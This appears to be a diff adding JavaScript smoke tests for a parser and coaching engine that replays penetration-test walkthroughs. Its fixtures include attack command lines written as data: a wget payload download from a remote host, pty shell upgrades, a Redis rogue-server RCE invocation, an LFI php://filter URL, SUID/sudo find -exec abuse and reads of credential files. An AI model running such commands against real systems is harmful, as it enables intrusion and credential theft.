@@ -1302,6 +1302,358 @@ function runSmokeSuite() {
     assert.ok(!allMinted.includes('foothold.windows'), 'DOSBox MOUNT C / prompt on Linux foothold must not mint foothold.windows');
   });
 
+  // =========================================================================
+  // PG-3 Wave-B Slice B4: Extractor, Harvester, and Trajectory Replay Checks
+  // =========================================================================
+
+  test('PG3-B4-1: Space-separated working-directory Unix prompts split cleanly without merging into prior turns', () => {
+    const seg = extractor.segmentBlock([
+      '$ gobuster dir -u http://198.51.100.70:8080 -w /usr/share/wordlists/common.txt',
+      '/admin                (Status: 301) [Size: 0]',
+      '/config               (Status: 301) [Size: 0]',
+      'www-data@198.51.100.70 ~$ id',
+      'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+      'www-data@app-node-03 /var/www/app$ which nc',
+      '/bin/nc'
+    ].join('\n'));
+    assert.strictEqual(seg.units.length, 3, 'Expected 3 distinct turns after space-cwd prompt splitting');
+    assert.ok(/^gobuster\b/.test(seg.units[0].command));
+    assert.ok(!/uid=33/.test(seg.units[0].output), 'Target shell id output must not leak into gobuster stdout');
+    assert.strictEqual(seg.units[1].command, 'id');
+    assert.strictEqual(seg.units[1].user, 'www-data');
+    assert.strictEqual(seg.units[2].command, 'which nc');
+    assert.strictEqual(seg.units[2].host, 'app-node-03');
+  });
+
+  test('PG3-B4-2: Iterative double-prompt peeling strips duplicated PTY prompt prefixes', () => {
+    const mp = extractor.matchPromptLine('svc_worker@app-node-03:~$ svc_worker@app-node-03:~$ whoami');
+    assert.ok(mp, 'Expected double-echoed Unix prompt to match');
+    assert.strictEqual(mp.command, 'whoami');
+    assert.strictEqual(mp.rawCommand, 'whoami');
+    assert.strictEqual(mp.user, 'svc_worker');
+    assert.strictEqual(mp.host, 'app-node-03');
+
+    const seg = extractor.segmentBlock([
+      '$ python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+      'svc_worker@app-node-03:~$ svc_worker@app-node-03:~$ id',
+      'uid=1001(svc_worker) gid=1001(svc_worker) groups=1001(svc_worker)'
+    ].join('\n'));
+    assert.strictEqual(seg.units.length, 2);
+    assert.strictEqual(seg.units[0].followPrompt, 'svc_worker@app-node-03:~$');
+    assert.strictEqual(seg.units[1].command, 'id');
+  });
+
+  test('PG3-B4-3: Pseudo-shell and relative-cwd target Unix prompts split cleanly with remote-linux hostHint', () => {
+    const seg = extractor.segmentBlock([
+      'webapp-shell# cat /var/www/app/settings.php',
+      '$db_pass = "SynthDbSecret88";',
+      'op_admin/work$ /usr/bin/wget http://198.51.100.2/helper -O /tmp/helper',
+      'Saving to: \'/tmp/helper\'',
+      'op_admin@app-node-03:/home/op_admin/work$ su svc_elev',
+      'Password:'
+    ].join('\n'));
+    assert.strictEqual(seg.units.length, 3);
+    assert.strictEqual(seg.units[0].command, 'cat /var/www/app/settings.php');
+    assert.strictEqual(seg.units[0].hostHint, 'remote-linux');
+    assert.strictEqual(trajectories.isAttackerTurn(seg.units[0], {}), false);
+    assert.strictEqual(seg.units[1].command, '/usr/bin/wget http://198.51.100.2/helper -O /tmp/helper');
+    assert.strictEqual(seg.units[1].user, 'op_admin');
+    assert.strictEqual(seg.units[1].hostHint, 'remote-linux');
+    assert.strictEqual(trajectories.isAttackerTurn(seg.units[1], {}), false);
+    assert.strictEqual(seg.units[2].command, 'su svc_elev');
+  });
+
+  test('PG3-B4-4: Bare-hash prose guards, active REPL bare-hash suppression, and explicit pty.spawn followPrompt propagation', () => {
+    assert.strictEqual(extractor.isBareHashCommand('# /bin/sh shell'), false);
+    assert.strictEqual(extractor.isBareHashCommand('# /bin/bash shel'), false);
+    assert.strictEqual(extractor.isBareHashCommand('# hostname looks odd; maybe container?'), false);
+    assert.strictEqual(extractor.isBareHashCommand('# use op_user id_rsa to transfer custom id_rsa.pub to /home/op_user/.ssh/'), false);
+    assert.strictEqual(extractor.isBareHashCommand('# source shows'), false);
+
+    assert.strictEqual(extractor.isBareHashCommand('# /bin/bash -p'), true);
+    assert.strictEqual(extractor.isBareHashCommand('# use exploit/multi/handler'), true);
+    assert.strictEqual(extractor.isBareHashCommand('# source ~/.bashrc'), true);
+
+    const replSeg = extractor.segmentBlock([
+      'postgres=# SELECT * FROM cmd_out;',
+      ' uid=999(postgres) gid=999(postgres)',
+      '# /bin/sh shell',
+      '# id'
+    ].join('\n'));
+    assert.strictEqual(replSeg.units.length, 1, 'Active DB REPL must suppress bare-hash author notes');
+    assert.ok(replSeg.units[0].output.indexOf('# /bin/sh shell') >= 0);
+
+    const ptySeg = extractor.segmentBlock([
+      'op_user@app-node-03:/tmp$ python3 local_helper_exploit.py',
+      '[+] Triggering payload',
+      '# python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+      'root@app-node-03:/root# id',
+      'uid=0(root) gid=0(root) groups=0(root)'
+    ].join('\n'));
+    assert.strictEqual(ptySeg.units.length, 3);
+    assert.strictEqual(ptySeg.units[0].command, 'python3 local_helper_exploit.py');
+    assert.strictEqual(ptySeg.units[0].followPrompt, 'root@app-node-03:/root#');
+    assert.strictEqual(ptySeg.units[1].followPrompt, 'root@app-node-03:/root#');
+    assert.strictEqual(ptySeg.units[2].command, 'id');
+  });
+
+  test('PG3-B4-5: Bare fence classifier recovers standalone Nmap Host script results, pspy CMD lines, and single-bar LinPEAS headers', () => {
+    const nseText = [
+      'Host script results:',
+      '| smb-enum-shares:',
+      '|   account_used: guest',
+      '|   \\\\198.51.100.71\\IPC$:',
+      '|_    Anonymous access: READ'
+    ].join('\n');
+    assert.strictEqual(extractor.classifyFenceBlock('', nseText).include, true);
+    const nseSeg = extractor.segmentBlock(nseText);
+    assert.strictEqual(nseSeg.units.length, 1);
+    assert.strictEqual(nseSeg.units[0].command, 'nmap');
+    assert.strictEqual(nseSeg.units[0].rawCommand, '');
+
+    const pspyText = '2026/05/12 09:14:02 CMD: UID=0    PID=4120   | /bin/sh -c /usr/local/bin/rotate_logs.sh';
+    assert.strictEqual(extractor.classifyFenceBlock('', pspyText).include, true);
+
+    const peasSubHeader = '\u2550\u2563 Writable passwd file? .............. /etc/passwd is writable';
+    assert.strictEqual(extractor.classifyFenceBlock('', peasSubHeader).include, true);
+  });
+
+  test('PG3-B4-6: Bare fence classifier recovers URL-encoded credential callbacks and target HTTP/LFI source captures while rejecting static code', () => {
+    const callbackBody = 'first_name%3DOps%26username%3Dsvc_mail%26password%3DSynthMailPass77%21';
+    assert.strictEqual(extractor.classifyFenceBlock('', callbackBody).include, true);
+
+    const httpCapture = [
+      'http://198.51.100.72:8080/cfg/cache.conf',
+      '# requirepass SynthCacheSecret55'
+    ].join('\n');
+    const httpCls = extractor.classifyFenceBlock('', httpCapture);
+    assert.strictEqual(httpCls.include, true);
+    assert.strictEqual(httpCls.reason, 'bare-http-capture');
+    const httpSeg = extractor.segmentBlock({ text: httpCapture, classificationReason: httpCls.reason });
+    assert.strictEqual(httpSeg.units.length, 1);
+    assert.strictEqual(httpSeg.units[0].command, 'curl');
+    assert.ok(httpSeg.units[0].output.indexOf('SynthCacheSecret55') >= 0);
+
+    const lfiSource = [
+      'PD9waHAgJGRiX3VzZXIgPSAnYXBwX3N2Yyc7ICRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsgPz4=',
+      '# decode',
+      '<?php',
+      '$db_user = "app_svc";',
+      '?>'
+    ].join('\n');
+    const lfiCls = extractor.classifyFenceBlock('', lfiSource, {
+      prevProseLines: ['Synthetic test url `http://198.51.100.72/portal.php?tpl=php://filter/convert.base64-encode/resource=synth_cfg`']
+    });
+    assert.strictEqual(lfiCls.include, true);
+    assert.strictEqual(lfiCls.reason, 'bare-lfi-source');
+
+    assert.strictEqual(extractor.classifyFenceBlock('', '<?php\nfunction localHelper($x) { return $x + 1; }\n?>').include, false);
+    assert.strictEqual(extractor.classifyFenceBlock('', 'https://github.com/example/project?tab=readme\nProject notes').include, false);
+  });
+
+  test('PG3-B4-7: smtp-user-enum is registered in isCommandLikeLine, detectTool, and FACT_BEARING', () => {
+    assert.strictEqual(extractor.isCommandLikeLine('smtp-user-enum -M VRFY -U /tmp/users.txt -t 198.51.100.73'), true);
+    assert.strictEqual(extractor.detectTool('smtp-user-enum -M VRFY -U /tmp/users.txt -t 198.51.100.73'), 'smtp-user-enum');
+    assert.strictEqual(extractor.detectTool('sudo perl smtp-user-enum.pl -M VRFY -U /tmp/users.txt -t 198.51.100.73'), 'smtp-user-enum');
+    assert.strictEqual(extractor.FACT_BEARING.has('smtp-user-enum'), true);
+  });
+
+  test('PG3-B4-8: VPN interface packet sniffer during active target shell classifies as attacker callback housekeeping', () => {
+    const activeTargetCtx = {
+      inTargetShell: true,
+      facts: new Set(['foothold.linux']),
+      target: '198.51.100.74'
+    };
+    const vpnSnifferTurn = {
+      kind: 'bare',
+      isDollar: true,
+      promptLine: '$ sudo tcpdump -i tun0 icmp',
+      command: 'sudo tcpdump -i tun0 icmp'
+    };
+    assert.strictEqual(trajectories.isAttackerTurn(vpnSnifferTurn, activeTargetCtx), true);
+    const hk = trajectories.isHousekeepingTurn(vpnSnifferTurn, activeTargetCtx);
+    assert.strictEqual(hk.housekeeping, true);
+    assert.strictEqual(hk.reason, 'attacker_callback_listener');
+
+    const remoteEthSnifferTurn = {
+      kind: 'unix',
+      host: 'app-node-04',
+      user: 'op_user',
+      promptLine: 'op_user@app-node-04:~$ sudo tcpdump -i eth0',
+      command: 'sudo tcpdump -i eth0'
+    };
+    assert.strictEqual(trajectories.isAttackerTurn(remoteEthSnifferTurn, activeTargetCtx), false);
+  });
+
+  test('PG3-B4-9: OS-aware config file read routing maps Linux .ini/.conf reads to linux-loot-hunt instead of Windows stored-credentials', () => {
+    const linuxMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'app-node-05', user: 'op_user', kind: 'unix', command: 'cat /opt/service/worker.ini' },
+      { facts: new Set(['foothold.linux']), inTargetShell: true, target: '198.51.100.75' }
+    ).map(c => c.id);
+    assert.strictEqual(linuxMoves[0], 'linux-loot-hunt');
+    assert.ok(!linuxMoves.includes('stored-credentials'));
+    assert.ok(!linuxMoves.includes('windows-loot-hunt'));
+
+    const winMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'WIN-NODE-05', kind: 'powershell', command: 'Get-Content C:\\ProgramData\\App\\worker.ini' },
+      { facts: new Set(['foothold.windows']), inTargetShell: true, target: '198.51.100.76' }
+    ).map(c => c.id);
+    assert.ok(winMoves[0] === 'windows-loot-hunt' || winMoves[0] === 'stored-credentials');
+    assert.ok(winMoves.includes('stored-credentials'));
+  });
+
+  test('PG3-B4-10: Broadened find -exec action attribution routes custom SUID/sudo payloads while sparing passive file readers', () => {
+    const linuxFacts = new Set(['foothold.linux', 'privesc.suid', 'privesc.sudo_rights']);
+    const customExecMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'app-node-06', kind: 'unix', command: 'find . -exec \'./priv_wrapper\' \\;' },
+      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.77' }
+    ).map(c => c.id);
+    assert.strictEqual(customExecMoves[0], 'suid-gtfobins');
+    assert.ok(!customExecMoves.includes('flag-hunt-linux') && !customExecMoves.includes('flag-hunt-root-linux'));
+
+    const sudoFindExecMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'app-node-06', kind: 'unix', command: 'sudo find /tmp -exec /usr/local/bin/helper_bin \\;' },
+      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.77' }
+    ).map(c => c.id);
+    assert.strictEqual(sudoFindExecMoves[0], 'sudo-abuse');
+
+    const passiveCatMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'app-node-06', kind: 'unix', command: 'find / -name proof.txt -exec cat {} \\;' },
+      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.77' }
+    ).map(c => c.id);
+    assert.strictEqual(passiveCatMoves[0], 'flag-hunt-root-linux');
+    assert.ok(!passiveCatMoves.includes('suid-gtfobins'));
+  });
+
+  test('PG3-B4-11: Command-less Nmap open-port tables and Redis/MySQL CLI turns map to their catalog moves', () => {
+    const cmdlessNmapMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      {
+        kind: 'unprompted',
+        command: '',
+        stdout: '22/tcp   open  ssh     OpenSSH 8.4p1\n80/tcp   open  http    nginx 1.18.0\n6379/tcp open  redis   Redis 6.0.16'
+      },
+      { facts: new Set(), target: '198.51.100.78' }
+    ).map(c => c.id);
+    assert.strictEqual(cmdlessNmapMoves[0], 'nmap-fast-open-ports');
+
+    const redisInfoMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'kali', kind: 'unix', command: 'redis-cli -h 198.51.100.78 info server' },
+      { facts: new Set(['port:6379', 'redis.reachable']), target: '198.51.100.78' }
+    ).map(c => c.id);
+    assert.strictEqual(redisInfoMoves[0], 'redis-enum');
+
+    const redisRceMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'kali', kind: 'unix', command: 'python3 redis-rce.py -r 198.51.100.78 -p 6379 -L 10.10.14.5 -f module.so' },
+      { facts: new Set(['port:6379', 'redis.reachable', 'redis.unauth']), target: '198.51.100.78' }
+    ).map(c => c.id);
+    assert.ok(
+      redisRceMoves[0] === 'redis-rogue-server-rce' || redisRceMoves[0] === 'redis-rce',
+      'Expected redis RCE move at #1, got ' + redisRceMoves[0]
+    );
+
+    const mysqlLoginMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'app-node-07', kind: 'unix', command: 'mysql -u db_user -p' },
+      { facts: new Set(['foothold.linux', 'db.creds']), inTargetShell: true, target: '198.51.100.78' }
+    ).map(c => c.id);
+    assert.strictEqual(mysqlLoginMoves[0], 'mysql-login');
+
+    const mysqlLootMoves = trajectories.matchTurnToCatalogMoves(
+      OBOL,
+      { host: 'app-node-07', kind: 'repl', command: 'mysql select login_name, pass_digest from members;' },
+      { facts: new Set(['foothold.linux', 'db.session']), inTargetShell: true, target: '198.51.100.78' }
+    ).map(c => c.id);
+    assert.strictEqual(mysqlLootMoves[0], 'mysql-loot');
+  });
+
+  test('PG3-B4-12: Closed-loop reachability deduplicates computeCoach calls, reports settled_by_engine drift, and seeds pre-command promptLine', () => {
+    const sess = newSession('198.51.100.79', '10.10.14.5');
+    sess.ingestTurn({
+      command: 'nmap -sC -sV 198.51.100.79',
+      stdout: [
+        'Nmap scan report for 198.51.100.79',
+        'PORT     STATE SERVICE VERSION',
+        '22/tcp   open  ssh     OpenSSH 8.4p1 Debian',
+        '80/tcp   open  http    Apache httpd 2.4.52',
+        '6379/tcp open  redis   Redis key-value store 6.0.16'
+      ].join('\n'),
+      target: '198.51.100.79'
+    });
+    const baseCoach = sess.computeCoach('198.51.100.79');
+    const flow = baseCoach.onFlow || [];
+    if (flow.length >= 2) {
+      const targetMove = flow[flow.length - 1];
+      let coachCalls = 0;
+      let ingestCalls = 0;
+      const origCompute = sess.computeCoach.bind(sess);
+      const origIngest = sess.ingestTurn.bind(sess);
+      sess.computeCoach = function (t) {
+        coachCalls++;
+        return origCompute(t);
+      };
+      sess.ingestTurn = function (o) {
+        ingestCalls++;
+        return origIngest(o);
+      };
+      trajectories.evaluateClosedLoopReachability(
+        sess,
+        [{ id: targetMove.id, move: targetMove, score: 25 }],
+        { command: 'synthetic' },
+        { targetIp: '198.51.100.79', historyTurns: [], executedMoveIds: new Set() }
+      );
+      sess.computeCoach = origCompute;
+      sess.ingestTurn = origIngest;
+      const maxAllowedCalls = ingestCalls + 2;
+      assert.ok(coachCalls <= maxAllowedCalls, 'Expected deduplicated computeCoach calls <= ' + maxAllowedCalls + ', got ' + coachCalls);
+    }
+
+    const driftMove = {
+      id: 'synthetic-settled-drift-move',
+      produces: ['privesc.leads', 'host.kernel', 'host.arch'],
+      commands: [{ run: 'uname -a' }],
+      eligible: () => true,
+      settled: () => true,
+      obsolete: () => false
+    };
+    const driftRes = trajectories.evaluateClosedLoopReachability(
+      sess,
+      [{ id: driftMove.id, move: driftMove, score: 25 }],
+      { command: 'uname -a' },
+      { targetIp: '198.51.100.79', historyTurns: [], executedMoveIds: new Set() }
+    );
+    assert.strictEqual(driftRes.reachable, false);
+    assert.strictEqual(driftRes.settled_by_engine, true);
+    assert.strictEqual(driftRes.mode, 'settled_predicate_drift');
+    assert.ok(/SETTLED_PREDICATE_DRIFT/.test(driftRes.detail));
+
+    const rep = trajectories.replayWalkthrough(OBOL, {
+      slug: 'synth-preprompt-linux-ini',
+      markdown: [
+        '```console',
+        '[op_user@app-node-08 cfg]$ cat service_auth.ini',
+        'db_user = svc_reader',
+        'db_password = SynthIniPassword404!',
+        '```'
+      ].join('\n')
+    }, {
+      target: '198.51.100.80',
+      lhost: '10.10.14.5'
+    });
+    assert.strictEqual(rep.steps.length, 1);
+    assert.ok(
+      Array.isArray(rep.steps[0].matched_moves) && rep.steps[0].matched_moves[0] === 'linux-loot-hunt',
+      'Expected pre-command [op_user@app-node-08 cfg]$ prompt to route cat service_auth.ini to linux-loot-hunt'
+    );
+  });
+
   if (failures.length > 0) {
     console.error('\nPG-1 smoke suite FAILED: ' + failures.length + ' failed, ' + passed + ' passed.');
     process.exit(1);
